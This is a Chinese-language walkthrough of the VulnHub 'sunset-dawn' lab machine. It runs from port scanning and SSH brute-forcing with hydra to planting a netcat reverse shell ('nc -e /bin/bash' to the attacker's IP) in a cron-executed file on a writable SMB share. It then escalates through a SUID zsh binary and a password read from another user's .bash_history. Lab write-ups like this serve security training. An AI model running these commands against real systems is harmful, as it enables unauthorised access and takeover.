# sunset  
## 简述  
https://www.vulnhub.com/entry/sunset-dawn,341/  

## 服务发现和信息收集    
```
nmap 192.168.1.*  
nmap -A  -p 1-65535 192.168.1.165 
```  
![](https://raw.githubusercontent.com/shakeyin1998/picsformd/master/20200208144746.png)  
打开网站  
![](https://raw.githubusercontent.com/shakeyin1998/picsformd/master/20200208145400.png)  
发现其中给的信息提示网站正在被建设  
先对网站的服务进行爆破吧  
```
hydra - l root -P /usr/share/wordlists/rockyou.txt  ssh@ip  
```  
### 对目录进行扫描
```
python dirsearch.py -e php -u  
```  
### 发现其中的日志文件夹 
![](https://raw.githubusercontent.com/shakeyin1998/picsformd/master/20200208150144.png)  
其他的日志都不能打开，但是management.log 可以打开  
是否是存在文件读取的漏洞，尝试想要访问的文件进行爆破  
打开management.log 其中的数据是  
![](https://raw.githubusercontent.com/shakeyin1998/picsformd/master/20200210150525.png)  
发现可能是一个定时的任务

### 尝试进行上传漏洞挖掘
![](https://raw.githubusercontent.com/shakeyin1998/picsformd/master/20200208153033.png)  
发现并没有文件读取漏洞，回到之前的端口上来   
开始对端口进行爆破  
发现开启了smb的端口，很可能存在很多的问题   
***  
卡了很久  
***  
之后是看了别人的wp写出来的  

### 对SMB进行扫描
![](https://raw.githubusercontent.com/shakeyin1998/picsformd/master/20200210150909.png)  
发现其中正好可以写入文件，又恰恰是执行定时文件的地方，所以写入反弹文件进行上传  
写入的文件的内容  
``` 
nc -e /bin/bash 192.168.1.39 1235 
``` 
 连接命令和上传的脚本  
 ![](https://raw.githubusercontent.com/shakeyin1998/picsformd/master/20200210151220.png)  
 等待
成功反弹shell  
![](https://raw.githubusercontent.com/shakeyin1998/picsformd/master/20200210150154.png)  
## 权限提升  
交互式shell  
```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```  
寻找可以特殊指令  
```
find / -perm -u=s -type f 2>/dev/null
```
![](https://raw.githubusercontent.com/shakeyin1998/picsformd/master/20200210151516.png)  
其中的zsh指令很可疑，所以执行以下 ...
![](https://raw.githubusercontent.com/shakeyin1998/picsformd/master/20200210151836.png)  
现在是dawn的用户  
在/home/ganimedes/.bash_history 当中看到之前的命令  
![](https://raw.githubusercontent.com/shakeyin1998/picsformd/master/20200210152020.png)  
得到密码  
![](https://raw.githubusercontent.com/shakeyin1998/picsformd/master/20200210152141.png)
成功提权
## 总结  
通过文件泄露发现定时任务  
继续发现了SMB的上传漏洞，通过利用这个漏洞上传我们的一句话反弹shell的脚本从而获得了一个最基础的权限  
通过特殊的指令以及查找执行指令的历史发现了我们的root密码，从而提权成功  